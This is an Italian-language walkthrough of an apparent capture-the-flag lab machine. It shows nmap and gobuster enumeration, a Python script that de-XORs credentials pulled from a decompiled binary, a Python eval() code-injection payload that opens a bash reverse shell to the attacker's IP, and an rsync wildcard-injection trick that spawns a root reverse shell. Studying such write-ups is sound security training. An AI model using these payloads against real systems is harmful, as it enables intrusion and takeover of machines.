
# Enumerazione

Prima cosa da fare : 
- `nmap -sP <mio_ip>/24` per trovare l'ip della macchina target

Poi nmap su macchina target con :
- `nmap -sn -sC -sV <target_ip>`

Il risultato di nmap sarà il seguente : 

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-14 12:01 CEST
Stats: 0:00:12 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 83.33% done; ETC: 12:01 (0:00:02 remaining)
Stats: 0:00:12 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 95.34% done; ETC: 12:01 (0:00:00 remaining)
Nmap scan report for 10.0.2.5
Host is up (0.000061s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 5b:a3:21:7d:5d:a5:e9:0f:97:12:4f:ec:11:2c:70:a4 (RSA)
|   256 88:9a:df:c4:40:4a:21:97:f9:70:6b:81:7a:52:6b:76 (ECDSA)
|_  256 64:06:54:cd:e5:5d:df:d5:e1:c5:86:68:0e:40:01:60 (ED25519)
80/tcp   open  http     nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Welcome to nginx!
443/tcp  open  ssl/http nginx 1.18.0 (Ubuntu)
| tls-alpn:
|_  http/1.1
| ssl-cert: Subject: commonName=robot.vdsi/organizationName=VDSI/stateOrProvinceName=Lazio/countryName=IT
| Not valid before: 2021-07-20T11:23:27
|_Not valid after:  2022-07-20T11:23:27
| tls-nextprotoneg:
|_  http/1.1
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
8080/tcp open  http     nginx 1.18.0 (Ubuntu)
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: nginx/1.18.0 (Ubuntu)
8081/tcp open  http     nginx 1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: nginx/1.18.0 (Ubuntu)
8082/tcp open  http     nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
MAC Address: 08:00:27:5E:8E:E7 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.96 seconds
```
## Primo approccio

Navighiamo su http://10.0.2.5 e troviamo la pagina di benvenuto di nginx

Eseguiamo un gobuster sul sito e ci trova un endpoint "/connector", lo scarichiamo e lo apriamo con ghidra

Ghidra ci fa vedere il file decompliato, e da come possiamo vedere nel main viene eseguita la funzione `cryptHelper`, che cripta username e password usando determinati dati

Da come possiamo vedere, dopo aver usato al funzione cryptHelper, il risultato viene controllato e confrontato con due variaibli globali : 
- `DAT_0001207b`
- `DAT_00012085`

Che indicano rispettivamente username e password

Clicchiamo su ognugno ed evidenziamo i byte, poi tasto destro -> copy special -> python list, e il risultato dovrebbe essere il seguente

`[ 0x30, 0x0d, 0x13, 0x2e, 0x09, 0x16, 0x24, 0x0d, 0x17, 0x00 ]`

Stessa cosa la facciamo con l'altro dato, e poi usiamo questi dati in uno script python per effettuare il de-xor dei dati, il file si chiama dexor.py, ed è il seguente

```python
ENC_USERNAME = [0x30, 0x0D, 0x13, 0x2E, 0x09, 0x16, 0x24, 0x0D, 0x17, 0x00]
ENC_PASSWORD = [
    0x10,
    0x5B,
    0x13,
    0x78,
    0x09,
    0x49,
    0x24,
    0x5B,
    0x17,
    0x1B,
    0x51,
    0x5D,
    0x70,
    0x1F,
    0x0A,
    0x39,
    0x01,
    0x00,
]

KEY = "TheKey"

def de_xor(encrypted, key) -> str:

    key_idx = 0
    plaintext = ""
    for c in encrypted:
        plaintext += chr(ord(key[key_idx % len(key)]) ^ c)
        key_idx += 1
    return plaintext


print(
    f"username: {de_xor(ENC_USERNAME, KEY)[:-1]}, password:{de_xor(ENC_PASSWORD, KEY)[:-1]}"
)
```

lo eseguiamo e otteniamo delle credenziali, ovvero : 
- Username : `developer`
- Password : `D3v3l0p3rP4$$word`

Con queste credenziali proviamo ad entrare in ssh, ma non ci fa accedere, quindi dobbiamo fare un ulteriore enumerazione

# Enumerazione parte 2 (vhost)

Avevamo visti dalla scansione nmap che c'era un common name, ovvero `robot.vdsi`. Questo ci suggerisce la presenza di un virtual host.

(Se la scansione non va e da problemi del tipo : `dial tcp:lookup robot.vdsi no such host`, si rimedia cosi : 
- Aprire /etc/host
- Aggiungere <target_ip> robot.vdsi)

Proviamo ad enumerare con gobuster, e troviamo un vhost chiamato calculator.robot.vdsi (anche questo va aggiungo come robot.vdsi)

Una volta entrati ci chiede username e password, e qui possiamo usare quelli trovati prima

Controlliamo il codice sorgente della pagina, e troviamo un commento che ci dice che la pagina è stata scritta in python, quindi potrebbe usare la funzione `eval()` che sappaimo essere vulnerabile al **code injection**

Usiamo ciò per prendere la shell

Scriviamo questo nel campo che verrà preso in input : 
- `__import__('os').system("/bin/bash -c 'sh -i >& /dev/tcp/<tuo_ip>/<porta> 0>&1'")`

Dopo aver ottenuto la reverse shell, lanciamo il comando 

>**"python3 -c 'import pty;pty.spawn("/bin/bash")'"**

per spawnare una shell funzionante

Ora siamo l'utente blunder, e dobbiamo fare privilege escalation

# Utente blunder

Vediamo che nella cartella backup_container ci sono un crontab e un file chiamato backup.sh, nel file backup.sh vediamo che viene seguito il comando rsync -a * (la presenza di wildcart ci assicura un possibile exploit)

Vedendo online abbiamo trovato che si può fare la wildcard exploitations, e con rsync basta fare questo

- 1) creiamo un file shell.sh, al cui interno mettiamo la seguente stringa 
	- `bash -c 'bash -i >& /dev/tcp/<tuo_ip>/<porta> 0>&1'`
- 2) poi lanciamo il comando `touch -- '-e sh shell.sh'` e attendiamo la connessione

# Privilege Escalation

In teoria qui c'era da fare un ulteriore passaggio, ovvero passare per l'utente Aris, fare docker escape e poi prendere la shell di root, però una volta lanciato lo script shell.sh l'unica shelle che possiamo ottenere è quella di root, quindi bho

Una volta presa la shell con netcat, saremo utente ROOT